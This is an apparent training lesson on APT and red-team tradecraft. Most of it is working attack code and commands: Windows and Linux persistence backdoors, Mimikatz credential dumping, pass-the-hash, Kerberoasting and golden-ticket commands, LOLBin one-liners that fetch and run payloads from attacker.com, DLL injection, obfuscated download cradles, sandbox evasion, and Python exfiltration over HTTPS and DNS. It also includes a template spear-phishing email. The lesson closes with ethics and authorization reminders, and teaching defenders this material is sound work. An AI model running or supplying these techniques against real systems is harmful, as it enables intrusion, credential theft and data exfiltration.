# APT Tactics and Red Team Operations

Advanced Persistent Threats (APTs) and sophisticated red teams use tactics far beyond simple exploits. This lesson explores the methodologies, techniques, and tools used in advanced offensive operations.

## The Kill Chain

### Lockheed Martin Cyber Kill Chain

**7 stages of attack:**

1. **Reconnaissance** - Research target
2. **Weaponization** - Create malicious payload
3. **Delivery** - Transmit weapon to target
4. **Exploitation** - Trigger vulnerability
5. **Installation** - Install backdoor
6. **Command & Control (C2)** - Establish communication
7. **Actions on Objectives** - Achieve goal

**Defensive value:** Break the chain at any point to stop attack.

### MITRE ATT&CK Framework

**Structured knowledge base of tactics and techniques.**

**14 Tactics:**
1. Reconnaissance
2. Resource Development
3. Initial Access
4. Execution
5. Persistence
6. Privilege Escalation
7. Defense Evasion
8. Credential Access
9. Discovery
10. Lateral Movement
11. Collection
12. Command and Control
13. Exfiltration
14. Impact

Each tactic contains multiple techniques and sub-techniques.

**Example - Persistence Techniques:**
- Boot or Logon Autostart Execution
- Create Account
- Scheduled Task/Job
- Valid Accounts
- Browser Extensions
- Office Application Startup

## Initial Access

### Spear Phishing

**Targeted phishing against specific individuals.**

**Components of successful spear phishing:**
- Reconnaissance (social media, LinkedIn, company site)
- Personalization (reference specific projects, people)
- Context (timing matters - before deadlines, holidays)
- Credible sender (compromised account or spoofing)
- Compelling action (urgency, authority, curiosity)

**Example email:**
```
From: IT Support <itsupport@company.com>
To: john.smith@company.com
Subject: URGENT: Password Reset Required - Security Alert

Hi John,

We've detected suspicious login attempts on your account from 
an IP address in Russia. For your security, please reset your 
password immediately using this secure link:

https://company-password-reset.com/reset?token=abc123

This link expires in 2 hours. If you don't reset your password,
your account will be locked.

Thank you,
IT Security Team
```

**Red flags defenders should catch:**
- Domain typosquatting (company vs company)
- Unusual urgency
- External link for password reset
- Grammar/spelling errors
- Sender address doesn't match display name

### Watering Hole Attacks

**Compromise websites target visits.**

**Process:**
1. Identify target organization
2. Research where employees browse
3. Compromise those websites
4. Inject malware/exploit
5. Wait for target to visit

**Example:**
- Target: Defense contractor employees
- Watering hole: Industry news site they all read
- Payload: Browser exploit or malicious download

### Supply Chain Attacks

**Compromise vendors to reach ultimate target.**

**Types:**
- Software supply chain (malicious updates)
- Hardware supply chain (backdoored components)
- Service provider compromise (access to multiple clients)

**Famous examples:**
- SolarWinds (Orion platform compromise)
- CCleaner (malicious update)
- ASUS Live Update (backdoored software)

## Persistence Mechanisms

### Registry Run Keys (Windows)

```powershell
# Current user
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\malware.exe"

# All users (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\malware.exe"
```

### Scheduled Tasks

```powershell
# Create scheduled task
schtasks /create /tn "Windows Update" /tr "C:\malware.exe" /sc onlogon /ru SYSTEM

# Or with XML for more control
schtasks /create /tn "Update" /xml task.xml
```

### Service Installation

```powershell
# Create malicious service
sc create "WindowsUpdater" binPath= "C:\malware.exe" start= auto

# Start service
sc start "WindowsUpdater"
```

### WMI Event Subscription

**Fileless persistence:**

```powershell
# Create event filter (trigger)
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "UpdateFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Create consumer (action)
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "UpdateConsumer"
    CommandLineTemplate = "powershell.exe -enc <base64_payload>"
}

# Bind filter to consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

### Linux Persistence

**Cron jobs:**
```bash
# User crontab
echo "@reboot /tmp/.hidden/backdoor.sh" | crontab -

# System-wide
echo "@reboot root /tmp/.hidden/backdoor.sh" >> /etc/crontab
```

**Systemd service:**
```bash
# Create service file
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service

[Service]
Type=simple
ExecStart=/tmp/.hidden/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl enable update.service
systemctl start update.service
```

**SSH keys:**
```bash
# Add attacker's public key
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

## Credential Access

### Credential Dumping

**Mimikatz (Windows):**
```powershell
# Dump passwords from LSASS
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump cached credentials
mimikatz.exe "lsadump::cache" "exit"

# Dump SAM database
mimikatz.exe "lsadump::sam" "exit"

# Export tickets for pass-the-ticket
mimikatz.exe "sekurlsa::tickets /export" "exit"
```

**Dumping /etc/shadow (Linux):**
```bash
# Read shadow file (requires root)
cat /etc/shadow

# Unshadow for cracking
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

### Pass-the-Hash

**Use NTLM hash without cracking password.**

```bash
# Using pth-toolkit
pth-winexe -U domain/user%hash //target cmd.exe

# Using Impacket
psexec.py -hashes :ntlm_hash user@target

# Using CrackMapExec
crackmapexec smb target -u user -H ntlm_hash
```

### Kerberoasting

**Extract and crack service account passwords.**

```powershell
# Request service tickets
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/server.domain.com"

# Export tickets
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Offline cracking
hashcat -m 13100 ticket.kirbi wordlist.txt
```

### Golden Ticket Attack

**Forge Kerberos tickets with compromised krbtgt hash.**

```powershell
# Get krbtgt hash (domain admin required)
mimikatz.exe "lsadump::dcsync /domain:company.com /user:krbtgt"

# Create golden ticket
mimikatz.exe "kerberos::golden /user:Administrator /domain:company.com /sid:S-1-5-21-... /krbtgt:hash /ptt"

# Now have domain admin access indefinitely
```

## Lateral Movement

### Pass-the-Ticket

```powershell
# Export tickets
mimikatz.exe "sekurlsa::tickets /export"

# Import ticket
mimikatz.exe "kerberos::ptt ticket.kirbi"

# Access remote system
dir \\server\c$
```

### PsExec

```bash
# Using Sysinternals PsExec
psexec.exe \\target -u domain\user -p password cmd.exe

# Using Impacket
psexec.py domain/user:password@target
```

### WMI Execution

```powershell
# Execute command remotely
wmic /node:target /user:domain\user /password:pass process call create "cmd.exe /c whoami"

# Using PowerShell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c command" -ComputerName target -Credential $cred
```

### SSH Lateral Movement

```bash
# Use compromised keys
ssh -i stolen_key user@target

# Port forwarding to reach internal systems
ssh -L 3389:internal-server:3389 user@jump-host

# Dynamic SOCKS proxy
ssh -D 8080 user@target
# Configure proxychains to use localhost:8080
proxychains nmap 10.0.0.0/24
```

## Command and Control (C2)

### C2 Frameworks

**Cobalt Strike:**
- Professional red team tool
- Beacon payload (HTTP, DNS, SMB)
- Malleable C2 profiles (customize traffic)
- Post-exploitation modules

**Metasploit:**
- Meterpreter payload
- Multiple C2 protocols
- Extensive post-exploitation

**Empire/Starkiller:**
- PowerShell-based (Windows)
- Python-based (Linux/Mac)
- Modular architecture

**Covenant:**
- .NET-based C2
- Good for modern Windows

### C2 Communication Channels

**HTTP/HTTPS:**
```
Beacon → C2 Server
GET /login.php HTTP/1.1
Host: legitimate-looking-domain.com
Cookie: session=<encrypted_data>
```

**DNS:**
```
Query: a8f3d2e1.command.attacker.com
Response: IP address encodes command

Query: 01b2c3d4.exfil.attacker.com (data exfiltration)
```

**Social Media:**
- Commands via Twitter/Facebook posts
- Responses via comments
- Steganography in images

**Cloud Storage:**
- Commands in Dropbox files
- Implant checks periodically
- Legitimate traffic, hard to block

### Domain Fronting

**Hide C2 destination using CDN.**

```
SNI: legitimate-cdn.cloudfront.net
Host header: attacker-controlled.cloudfront.net

CDN routes to attacker server based on Host header,
but TLS handshake shows legitimate domain.
```

## Defense Evasion

### Living Off the Land (LOLBins)

**Use legitimate Windows binaries for malicious purposes.**

**Examples:**

```powershell
# Download file using certutil
certutil.exe -urlcache -f http://attacker.com/malware.exe malware.exe

# Execute script using regsvr32
regsvr32.exe /s /n /u /i:http://attacker.com/evil.sct scrobj.dll

# Download and execute using mshta
mshta.exe http://attacker.com/payload.hta

# Binary proxy execution using rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write("<script>alert('code')</script>")
```

### Process Injection

**Hide malicious code in legitimate process.**

**Techniques:**

```c
// Classic DLL injection
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, pDllPath, dllPath, strlen(dllPath), NULL);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, LoadLibraryA, pDllPath, 0, NULL);
```

**Process hollowing:**
1. Create legitimate process in suspended state
2. Hollow out (unmap) its memory
3. Write malicious code
4. Resume execution

**Reflective DLL injection:**
- Load DLL without using LoadLibrary
- Entirely in memory, no disk writes

### Obfuscation

**PowerShell obfuscation:**
```powershell
# Original
Invoke-WebRequest -Uri http://attacker.com/malware.exe -OutFile malware.exe

# Obfuscated
$url='http://at'+'tacker.com/mal'+'ware.exe';
$out='mal'+'ware.exe';
.('I'+'nvoke-W'+'ebRequest') -Uri $url -OutFile $out

# Base64 encoded
powershell.exe -enc <base64_encoded_command>
```

**String encryption:**
```python
# Encrypt strings in malware
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt C2 domain
c2_domain = "attacker.com"
encrypted = cipher.encrypt(c2_domain.encode())

# In malware: decrypt at runtime
decrypted = cipher.decrypt(encrypted)
```

### Anti-Analysis

**Detect VMs and sandboxes:**
```python
import os
import subprocess

def is_virtualized():
    """Check if running in VM"""
    
    # Check for VM artifacts
    vm_files = [
        'C:\\Windows\\System32\\drivers\\vmmouse.sys',
        'C:\\Windows\\System32\\drivers\\vmhgfs.sys',
        '/dev/vmware'
    ]
    
    for f in vm_files:
        if os.path.exists(f):
            return True
    
    # Check for sandbox behavior
    if os.getenv('USERNAME') == 'sandbox':
        return True
    
    # Check uptime (sandboxes often have short uptime)
    uptime = int(subprocess.check_output('echo $(($(date +%s) - $(date -d "$(uptime -s)" +%s)))', shell=True))
    if uptime < 600:  # Less than 10 minutes
        return True
    
    return False

if is_virtualized():
    # Act benign or exit
    sys.exit(0)
else:
    # Execute malicious payload
    run_payload()
```

## Data Exfiltration

### Encrypted Channels

```python
import requests
from cryptography.fernet import Fernet

def exfiltrate_data(data, c2_url, key):
    """Exfiltrate encrypted data"""
    cipher = Fernet(key)
    encrypted = cipher.encrypt(data.encode())
    
    # Send over HTTPS (legitimate-looking traffic)
    response = requests.post(
        c2_url,
        data={'data': encrypted},
        headers={'User-Agent': 'Mozilla/5.0...'}
    )
    
    return response.status_code == 200
```

### DNS Tunneling

```python
import dns.resolver
import base64

def exfil_via_dns(data, domain):
    """Exfiltrate data via DNS queries"""
    # Encode and chunk data
    encoded = base64.b32encode(data.encode()).decode()
    chunk_size = 63  # DNS label max length
    
    for i in range(0, len(encoded), chunk_size):
        chunk = encoded[i:i+chunk_size]
        query = f"{chunk}.{domain}"
        
        try:
            dns.resolver.resolve(query, 'A')
        except:
            pass  # Don't care about response
```

### Steganography

```python
from PIL import Image

def hide_data_in_image(image_path, data, output_path):
    """Hide data in image LSB"""
    img = Image.open(image_path)
    encoded = img.copy()
    pixels = encoded.load()
    
    # Convert data to binary
    binary_data = ''.join(format(ord(c), '08b') for c in data)
    binary_data += '1111111111111110'  # End marker
    
    data_index = 0
    for y in range(img.size[1]):
        for x in range(img.size[0]):
            if data_index < len(binary_data):
                pixel = list(pixels[x, y])
                # Modify LSB of red channel
                pixel[0] = (pixel[0] & 0xFE) | int(binary_data[data_index])
                pixels[x, y] = tuple(pixel)
                data_index += 1
            else:
                break
    
    encoded.save(output_path)

# Use: Upload image to social media, C2 extracts data
```

## Red Team Operations

### Operational Security (OPSEC)

**Principles:**
- Minimize footprint
- Blend in with normal traffic
- Rotate infrastructure
- Use legitimate services
- Clean up artifacts

**Tradecraft:**
- Use encryption for all communications
- Separate testing and operational infrastructure
- Document everything (for report)
- Time operations appropriately
- Have rollback plans

### Rules of Engagement

**Typical ROE includes:**
- Authorized scope (IP ranges, domains)
- Prohibited actions (DoS, data destruction)
- Time windows for testing
- Escalation procedures
- Communication protocols
- Data handling requirements

### Post-Engagement

**Cleanup:**
- Remove backdoors
- Delete implants
- Clean logs (carefully, document first)
- Remove accounts created
- Close network connections

**Reporting:**
- Executive summary
- Technical findings
- Evidence (screenshots, logs)
- Risk ratings
- Remediation recommendations
- Timeline of activities

## Key Takeaways

**APT characteristics:**
- Long-term, patient operations
- Sophisticated techniques
- Well-resourced
- Clear objectives
- Custom tooling

**Defensive lessons:**
- Assume breach mentality
- Defense in depth essential
- Monitor for TTPs, not just IOCs
- Threat intelligence crucial
- Continuous improvement

**Ethical considerations:**
- Always authorized testing only
- Respect scope limitations
- Document everything
- Report responsibly
- Clean up completely

**Remember:**
- These techniques are powerful
- Use only with authorization
- Legal consequences for misuse
- Ethics matter
- Skills should protect, not harm

APT tactics represent the cutting edge of offensive security. Study them to better defend against real threats, practice in legal environments, and always use your skills ethically and responsibly.
